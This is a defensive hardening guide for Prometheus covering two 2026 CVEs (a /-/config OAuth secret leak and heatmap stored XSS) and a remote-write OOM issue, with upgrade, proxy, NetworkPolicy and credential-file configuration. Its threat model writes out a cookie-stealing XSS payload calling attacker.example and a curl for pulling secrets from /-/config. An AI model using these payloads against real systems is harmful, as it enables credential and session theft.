---
title: "Prometheus Remote Write and Config Endpoint Security"
description: "Harden Prometheus against CVE-2026-42151 OAuth credential exposure via /-/config, CVE-2026-42154 stored XSS, and the recurring pattern of security fixes shipped in routine Prometheus releases."
slug: prometheus-remote-write-security
date: 2026-05-02
lastmod: 2026-05-02
category: observability
tags: ["prometheus", "remote-write", "cve-2026-42151", "cve-2026-42154", "oauth", "credential-exposure", "xss"]
personas: ["sre", "security-engineer", "platform-engineer"]
article_number: 363
difficulty: intermediate
estimated_reading_time: 15
published: true
layout: article.njk
permalink: "/articles/observability/prometheus-remote-write-security/index.html"
---

# Prometheus Remote Write and Config Endpoint Security

## Problem

Prometheus remote write forwards metrics from a local Prometheus instance to a remote backend — Grafana Cloud, Thanos, Cortex, Mimir, or VictoriaMetrics — over HTTP. Remote write configurations include authentication credentials: API keys, OAuth client secrets, and bearer tokens. These credentials live in `prometheus.yml` or in Kubernetes Secrets mounted into the Prometheus pod. They allow Prometheus to authenticate outbound writes to the remote backend, and in the case of AzureAD OAuth, they represent a service principal credential that can be used to authenticate against Azure APIs well beyond the monitoring plane.

CVE-2026-42151, disclosed April 27, 2026, demonstrated a concrete exploitation path for this credential exposure. The `/-/config` endpoint, intended for operational debugging, returns the full Prometheus configuration as JSON or plain text. In Prometheus versions before v3.11.3 and v3.5.3, `client_secret` values from AzureAD OAuth remote write configurations appeared in plaintext in the `/-/config` response. The endpoint is unauthenticated by default. Any process or user that could reach Prometheus on port 9090 — including other pods in the same namespace, Kubernetes Jobs, or a developer with `kubectl port-forward` — could extract the AzureAD service principal secret without any authentication challenge. Fixed in Prometheus v3.11.3 and v3.5.3, released April 27, 2026.

CVE-2026-42154, also disclosed April 27, 2026, affected the Prometheus web UI's old interface. Heatmap chart tick label rendering did not sanitise metric label values before rendering them into the DOM. A metric label containing `<script>alert(document.cookie)</script>` or an `<img onerror=...>` payload would execute in the browser of any Prometheus administrator who viewed the heatmap. Because metric labels are controlled by the targets being scraped, an attacker who could inject metrics — via a compromised service, a malicious scrape target, or a careless label cardinality expansion — could store an XSS payload that persisted until the time series expired. The v3.11.3/v3.5.3 releases also fixed a separate vulnerability where snappy-compressed remote write requests exceeding the configured decode limit caused memory exhaustion — Prometheus would OOM before enforcing the size limit, creating a monitoring blackout during an incident.

The `/-/config` endpoint problem is broader than CVE-2026-42151. Even without the specific AzureAD client_secret bug, the endpoint exposes the full Prometheus configuration: all scrape configs, remote write destinations, alerting rule paths, and every credential embedded directly in the config file. Basic auth passwords, bearer tokens, and TLS private key paths all appear. Most Prometheus deployments do not restrict access to this endpoint because the default configuration binds port 9090 to all interfaces with no authentication. An operator who does not know this endpoint exists will not think to restrict it. CVE-2026-42151 is the consequence of that oversight compounded by a specific serialisation bug that printed `client_secret` where it should have been redacted — but the underlying architectural problem predates the CVE and persists even after patching.

The open source angle matters for understanding detection lag. Prometheus is a CNCF project with an active but lean security process. CVEs are typically disclosed alongside patch releases rather than under coordinated embargo. Both CVE-2026-42151 and CVE-2026-42154 were disclosed on the same day as the fix — April 27, 2026 — with the GitHub release notes at `https://github.com/prometheus/prometheus/releases/tag/v3.11.3` as the primary discovery mechanism. Operators who rely on Renovate or Dependabot auto-PRs without reading release notes will receive the version bump as a routine update labelled with a changelog summary, not a security advisory. CVE-2026-42151 was additionally preceded by a public GitHub issue that described the credential exposure in detail — describing exactly how to call `/-/config` to read the AzureAD secret — before a CVE was assigned. The issue was publicly visible for months, giving an attacker who monitors Prometheus issues a substantial lead over operators who only watch CVE feeds.

To catch these earlier, subscribe to Prometheus GitHub releases directly. You can poll for security-relevant release notes with:

```bash
gh api repos/prometheus/prometheus/releases \
  --jq '.[0:5] | .[] | select(.body | test("CVE|security|vuln|credential"; "i")) | {tag: .tag_name, published: .published_at}'
```

Watch changes to `web/api/v1/api.go` for modifications to the `/-/config` and `/-/targets` endpoint handlers — these are the code paths most likely to affect what credentials are visible. Subscribe to the Prometheus security mailing list and enable GitHub "Watch > Releases" on `prometheus/prometheus`.

Target systems: Prometheus < v3.11.3 / < v3.5.3 with AzureAD OAuth remote write or unauthenticated `/-/config` exposure.

## Threat Model

1. **Internal attacker or compromised pod** in the monitoring namespace runs `curl http://prometheus:9090/-/config`, parses the JSON response for the `remote_write[*].oauth2.client_secret` field, and authenticates to Azure as the Prometheus service principal. From there the attacker can enumerate Azure resources, read Key Vault secrets, or pivot to other services that trust the Prometheus managed identity.

2. **XSS via metric label injection**: an attacker controls a scrape target and sets a label value to `<script>fetch('https://attacker.example/c?'+document.cookie)</script>`. When a Prometheus administrator opens the heatmap view in the old UI, the script executes and exfiltrates the admin's browser session. Because Prometheus web sessions are often long-lived and shared across team members via a single org-wide instance, cookie theft against one administrator may grant access to the full Prometheus admin API.

3. **Patch-gap attacker**: reads the April 27, 2026 Prometheus release notes immediately on publication, identifies CVE-2026-42151 as an `/-/config` credential leak, and runs a Shodan or FOFA scan for Prometheus instances exposing port 9090 with an unauthenticated `/-/config` endpoint. Corporate internal networks frequently expose Prometheus without authentication. Prometheus instances on LoadBalancer services or with port-forward sessions left open are reachable. The attacker extracts AzureAD secrets across multiple organisations before patch rollout completes — a window that commonly spans days to weeks for Helm-managed workloads without auto-upgrade policies.

4. **Remote write OOM via oversized compressed payload**: a sender — whether a misconfigured Prometheus agent, a malicious internal service, or an attacker with write access to the remote write ingestion endpoint — sends a snappy-compressed body that decompresses to several gigabytes. Before the v3.11.3 fix, Prometheus decompressed the entire payload before enforcing the size limit, causing the process to exhaust heap memory and be OOM-killed. If this occurs during an incident, monitoring goes dark precisely when it is most needed.

The blast radius across these scenarios differs significantly. CVE-2026-42151 is a credential exfiltration with potential Azure lateral movement — the blast radius extends to whatever the Prometheus service principal can access in the Azure tenant, and AzureAD service principal secrets do not expire by default. CVE-2026-42154 is a targeted administrator account takeover — the blast radius is limited to operators with access to the Prometheus UI. The OOM scenario is a monitoring availability attack — it does not exfiltrate data but can blind defenders during an active incident, making it an attractive component of a multi-stage attack.

## Configuration / Implementation

### Upgrading Prometheus

The immediate remediation is upgrading to v3.11.3 (or v3.5.3 for the 3.5.x LTS branch). With the Prometheus Community Helm chart:

```bash
helm upgrade prometheus prometheus-community/prometheus \
  --reuse-values \
  --set server.image.tag=v3.11.3
```

Verify the running version:

```bash
curl -s http://prometheus:9090/api/v1/status/buildinfo | jq '.data.version'
```

Verify that the `/-/config` endpoint no longer exposes `client_secret` in plaintext after upgrade:

```bash
curl -s http://prometheus:9090/-/config | grep -i client_secret
# Should return no output on a patched instance with redaction applied
```

### Restricting the /-/config Endpoint

Even after patching CVE-2026-42151, the `/-/config` endpoint exposes your full scrape configuration, remote write targets, and any credentials embedded directly in `prometheus.yml`. Block it at the reverse proxy layer for all non-administrative users.

Nginx configuration fragment (place inside the `server {}` block that proxies to Prometheus):

```nginx
# Block /-/config and other sensitive admin endpoints for non-admins
location ~ ^/-/(config|flags|rules|targets) {
    # Restrict to the operations VLAN or bastion host
    allow 10.0.10.0/24;
    deny all;
}

# Optionally block quit and reload in production
location ~ ^/-/(quit|reload) {
    deny all;
}
```

Kubernetes NetworkPolicy restricting ingress to Prometheus port 9090:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: prometheus-ingress-restriction
  namespace: monitoring
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: prometheus
  policyTypes:
    - Ingress
  ingress:
    # Allow Grafana to scrape Prometheus as a datasource
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: grafana
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: grafana
      ports:
        - port: 9090
    # Allow the monitoring namespace itself (Alertmanager, etc.)
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: monitoring
      ports:
        - port: 9090
    # Deny all other ingress on 9090 by omission
```

If `/-/config` must remain accessible for operational workflows, require authentication using Prometheus's `--web.config.file` flag with a basic auth file:

```yaml
# web-config.yml (passed to --web.config.file)
basic_auth_users:
  # Generate with: htpasswd -nB ops-user
  ops-user: $2y$12$...bcrypt-hash-here...
```

```bash
# In the Prometheus server args
--web.config.file=/etc/prometheus/web-config.yml
```

### Moving Credentials Out of prometheus.yml

The root cause of CVE-2026-42151 is credentials stored inline in `prometheus.yml`. Move them to mounted files.

Instead of:

```yaml
remote_write:
  - url: https://remote-write.example.com/api/v1/write
    oauth2:
      client_id: "my-app-client-id"
      client_secret: "supersecret"        # visible in /-/config
      token_url: https://login.microsoftonline.com/tenant/oauth2/v2.0/token
```

Use a credentials file:

```yaml
remote_write:
  - url: https://remote-write.example.com/api/v1/write
    authorization:
      type: Bearer
      credentials_file: /var/run/secrets/remote-write-token
```

Create a Kubernetes Secret and mount it:

```yaml
apiVersion: v1
kind: Secret
metadata:
  name: prometheus-remote-write-token
  namespace: monitoring
type: Opaque
stringData:
  token: "your-bearer-token-or-api-key"
```

```yaml
# In the Prometheus Deployment or StatefulSet spec
volumeMounts:
  - name: remote-write-token
    mountPath: /var/run/secrets/remote-write-token
    subPath: token
    readOnly: true
volumes:
  - name: remote-write-token
    secret:
      secretName: prometheus-remote-write-token
```

For AzureAD OAuth specifically, you cannot move `client_secret` to a file with the `oauth2` stanza — use the `authorization` stanza with a token obtained by a sidecar instead. A Kubernetes sidecar can retrieve an AzureAD token via Workload Identity and write it to a shared `emptyDir` volume at `/var/run/secrets/remote-write-token`, which Prometheus reads from disk before each token refresh cycle.

### Remote Write TLS and Authentication Hardening

```yaml
remote_write:
  - url: https://remote-write.example.com/api/v1/write
    tls_config:
      ca_file: /etc/prometheus/certs/remote-write-ca.crt
      insecure_skip_verify: false        # must be false in production
      server_name: remote-write.example.com
    authorization:
      type: Bearer
      credentials_file: /var/run/secrets/remote-write-token
    queue_config:
      max_samples_per_send: 10000
      capacity: 50000
      max_shards: 8
```

Pin the CA certificate for the remote write endpoint — do not rely on the system trust store, which may be broader than intended. Set `server_name` explicitly if the remote write URL uses an IP or a different hostname than the TLS certificate's CN/SAN.

Rotate bearer tokens via a sidecar that periodically writes a new token to the credentials file. Prometheus re-reads `credentials_file` on each remote write request, so token rotation takes effect without a Prometheus restart.

### Disabling Unused Prometheus Web Endpoints

In production, disable lifecycle and admin API endpoints that are not required:

```bash
# Add to Prometheus server startup args
--web.enable-lifecycle=false      # disables /-/reload and /-/quit
--web.enable-admin-api=false      # disables TSDB admin endpoints
```

Verify that `/-/quit` is blocked:

```bash
curl -s -o /dev/null -w "%{http_code}" -X PUT http://prometheus:9090/-/quit
# Should return 403 or 404 when lifecycle API is disabled
```

Note that `--web.enable-lifecycle=false` means `/-/reload` no longer works, so configuration changes require a pod restart. Automate this in your CI/CD pipeline: after updating the `prometheus.yml` ConfigMap, issue a rolling restart with `kubectl rollout restart deployment/prometheus -n monitoring`.

### Remote Write Payload Size Limits

The snappy decode limit fix in v3.11.3 ensures Prometheus enforces the configured size limit before allocating memory for decompression. Ensure your remote write receiver also enforces limits:

```yaml
# In the Prometheus agent config (if using agent mode for forwarding)
remote_write:
  - url: https://remote-write.example.com/api/v1/write
    queue_config:
      max_samples_per_send: 10000
```

For the receiving side (Mimir, Cortex, Thanos Receive), configure the maximum request body size at the ingress or load balancer level:

```nginx
# Nginx config for remote write receiver proxy
location /api/v1/push {
    client_max_body_size 32m;
    proxy_pass http://mimir:8080;
}
```

Test that the size limit is enforced after upgrade:

```bash
# Generate a large random payload and attempt to POST it as snappy-encoded remote write
dd if=/dev/urandom bs=1M count=64 2>/dev/null | \
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://prometheus:9090/api/v1/write \
    -H "Content-Encoding: snappy" \
    -H "Content-Type: application/x-protobuf" \
    --data-binary @-
# Patched Prometheus returns 400 or 413 before OOM
```

### Monitoring Prometheus Releases for Security Fixes

Automate detection of security-relevant Prometheus releases:

```bash
# Check the last 5 releases for CVE or security mentions in release notes
gh api repos/prometheus/prometheus/releases \
  --jq '.[0:5] | .[] | select(.body | test("CVE|security|vuln|credential|XSS|fix.*secret"; "i")) | {tag: .tag_name, published: .published_at, excerpt: (.body | split("\n") | .[:5] | join(" "))}'
```

Watch for changes to the config endpoint handler:

```bash
# Check recent commits touching the /-/config handler
gh api repos/prometheus/prometheus/commits \
  --field path=web/api/v1/api.go \
  --jq '.[0:10] | .[] | {sha: .sha[0:8], message: .commit.message | split("\n")[0], date: .commit.author.date}'
```

Configure Renovate to open PRs for Prometheus Helm chart upgrades and set `minimumReleaseAge: 0` for security patches:

```json
{
  "packageRules": [
    {
      "matchPackageNames": ["prometheus-community/prometheus"],
      "matchUpdateTypes": ["patch"],
      "automerge": false,
      "labels": ["security-review-required"]
    }
  ]
}
```

## Expected Behaviour

| Signal | Default Prometheus (< v3.11.3) | Patched + Hardened |
|---|---|---|
| `GET /-/config` returns `client_secret` in plaintext | Yes — full AzureAD `client_secret` visible in JSON response | No — field redacted after CVE-2026-42151 fix; endpoint blocked by nginx/NetworkPolicy |
| XSS payload in metric label renders in heatmap UI | Yes — unescaped label value executes in browser | No — label values HTML-escaped in old UI after CVE-2026-42154 fix |
| Remote write OOM via oversized snappy payload | Yes — Prometheus decompresses before enforcing limit, OOM-killed | No — size limit enforced before allocation; returns 400 |
| `PUT /-/quit` accessible without authentication | Yes — terminates Prometheus process if lifecycle API enabled | No — `--web.enable-lifecycle=false` returns 403/404 |
| OAuth credential visible in GitHub release notes detection window | No automated detection; operators discover via Dependabot PR | `gh api` polling cronjob alerts within minutes of release publication |

## Trade-offs

| Aspect | Benefit | Cost | Mitigation |
|---|---|---|---|
| Disabling `/-/config` | Eliminates credential exposure via the debugging endpoint | Operators cannot inspect running config for troubleshooting; harder to verify config changes applied correctly | Keep access restricted to bastion/ops VLAN rather than fully blocking; use `kubectl exec` to view the mounted ConfigMap directly |
| Credentials file instead of inline | Credentials not visible in `/-/config`; mounted Secret can be rotated independently of the config | Requires Secret creation, volume mount management, and sidecar for AzureAD token refresh; more Kubernetes objects to maintain | Use External Secrets Operator to sync credentials from Vault or AWS Secrets Manager into Kubernetes Secrets automatically |
| Disabling `/-/reload` (`--web.enable-lifecycle=false`) | Prevents an attacker from triggering config reload with a crafted request | Requires pod restart for every config change; increases downtime window during config updates | Automate rolling restarts in CI/CD on ConfigMap change; use Prometheus Operator which handles restarts automatically |
| NetworkPolicy on port 9090 | Blocks lateral movement from non-monitoring namespaces to Prometheus | Grafana datasource queries fail if the Grafana namespace selector is misconfigured; initial policy rollout may break dashboards | Test NetworkPolicy in staging with `kubectl exec -n grafana -- curl prometheus:9090/api/v1/query` before production rollout |

## Failure Modes

| Failure | Symptom | Detection | Recovery |
|---|---|---|---|
| `credentials_file` not mounted or path incorrect | Remote write fails with authentication errors; `prometheus_remote_storage_failed_samples_total` increases; alerts stop reaching the remote backend | `kubectl logs -n monitoring -l app=prometheus | grep "opening file.*credentials"` shows file-not-found errors | Verify Secret exists and is mounted: `kubectl exec -n monitoring prometheus-0 -- ls -la /var/run/secrets/remote-write-token`; correct volumeMount path and redeploy |
| NetworkPolicy blocks Grafana datasource access on port 9090 | Grafana dashboards display "No data" or "Error" for all Prometheus-backed panels; Grafana logs show connection refused to Prometheus | `kubectl exec -n grafana grafana-0 -- curl -s -o /dev/null -w "%{http_code}" http://prometheus.monitoring:9090/api/v1/query?query=up`; should return 200, will return 000 if blocked | Add explicit allow rule in NetworkPolicy for the Grafana pod selector and namespace; apply and verify with `kubectl describe networkpolicy prometheus-ingress-restriction -n monitoring` |
| Disabling admin API breaks existing automation | Scripts calling `/-/config`, `/-/targets`, or TSDB admin endpoints return 403; Runbook scripts that relied on `/-/reload` fail silently | Audit automation scripts for Prometheus admin API calls before disabling; post-disable, check for 403 responses in Prometheus access logs | Re-enable the specific endpoint needed or migrate automation to use `kubectl exec` for config inspection and `kubectl rollout restart` for reloads |
| Prometheus upgrade changes config schema, breaking reload | Prometheus fails to start or logs config parse errors after upgrade; `prometheus_config_last_reload_successful` metric is 0 | Monitor `prometheus_config_last_reload_successful == 0` with an alert; check `kubectl logs` for YAML parse errors | Pin Prometheus version in Helm values and test config compatibility in staging before upgrading production; validate config with `promtool check config prometheus.yml` before rollout |

## Related Articles

- [Prometheus Security Metrics](/articles/observability/prometheus-security-metrics/) — what security-relevant metrics to collect and how to build alert rules on top of them
- [Grafana SQL Expressions Security](/articles/observability/grafana-sql-expressions-security/) — hardening Grafana against SQL injection and data source privilege escalation
- [OpenTelemetry Collector Hardening](/articles/observability/otel-collector-hardening/) — securing the collector pipeline that feeds data into Prometheus-compatible backends
- [Centralized Logging](/articles/observability/centralized-logging/) — log pipeline design that complements Prometheus metrics for security event correlation
- [Vulnerability Management Program](/articles/cross-cutting/vulnerability-management-program/) — the process for tracking CVE disclosures across your open source dependencies, including monitoring tools
